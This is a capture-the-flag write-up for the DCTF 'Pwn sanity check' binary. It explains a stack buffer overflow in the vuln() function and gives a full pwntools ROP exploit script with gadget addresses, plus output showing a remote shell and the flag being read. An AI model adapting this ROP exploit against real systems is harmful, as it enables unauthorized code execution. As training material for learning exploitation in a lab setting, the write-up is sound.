# Pwn sanity check

## Description

This should take about 1337 seconds to solve.

`nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480`

[pwn_sanity_check](pwn_sanity_check)

## Solution

### OVERVIEW

ELF 64-bit LSB executable, not stripped


### GOAL
    
The challenge is very simple it is all about using ROP technique. So basically, this means that we need to use traditional buffer overflow to change the value of the return address to mount our Ropchain, in order to call the `win` function which execute the system function to create a child process that executes `/bin/sh`.


### DETAILS

Let's begin. Taking a first look at the binary with `r2` we can clearly see the main function calls the `vuln()` function.
So now we can investigate the `vuln()` function.

The vulnerability within the program is in the `vuln` function which reads 256 characters from stdin by calling the `fgets` function.
There is no boundary checking and we can thus exploit this vulnerability to overwrite all values following the buffer on the stack.
Our mission is to call the `win()` function. It is not called in the program’s execution flow so we need to mount our Ropchain in order to carry out this task.
Since the win function takes two arguments as parameters we have to search for `pop|pop|ret` gadgets.

At first we calculated the offset to the return address using a pattern created by us (we can also use the `gdb` command `pattern`). The offset is `72 bytes`.

Now ne need to search for `pop|pop|ret` ROP-gadgets. We can use `ROPgadget` tool which lets us search our gadgets on our binary.

```console
$ ROPgadget --binary ./pwn_sanity_check --only="pop|pop|ret" 
```

Since we have a `64-bit binary` and the `win()` function takes two argument the gadgets that interests us are:

- `pop rdi; ret`
- `pop rsi ; pop r15 ; ret`

We have the offset to the return address and the gadgets, now we just have to put things together in the correct order and there we have it.

```
ROP_chain: junk + pop_rdi; ret + pop rsi ; pop r15 ; ret + win_address
```

```python
from pwn import *
import struct

param1 = p64(0xdeadbeef)
param2 = p64(0x1337c0de)
win = p64(0x0000000000400697)
pop_pop_ret = p64(0x0000000000400811) #pop rsi ; pop r15 ; ret
pop_ret = p64(0x0000000000400813) #pop rdi; ret

payload = b'A'*72;
payload += pop_ret;
payload += param1;
payload += pop_pop_ret;
payload += param2;
payload += param2;
payload += win;
#payload += p64(0x004006db);

p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io',7480)
#p = process('./pwn_sanity_check')
print(p.recvline())
p.sendline(payload)
print(p.recvline())
p.interactive()
```

```console
$ python exploit.py 
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
b'tell me a joke\n'
b'will this work?\n'
[*] Switching to interactive mode
you made it to win land, no free handouts this time, try harder
one down, one to go!
2/2 bro good job
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
```

#### **FLAG >>** `ctf{Ju5t_m0v3_0n}`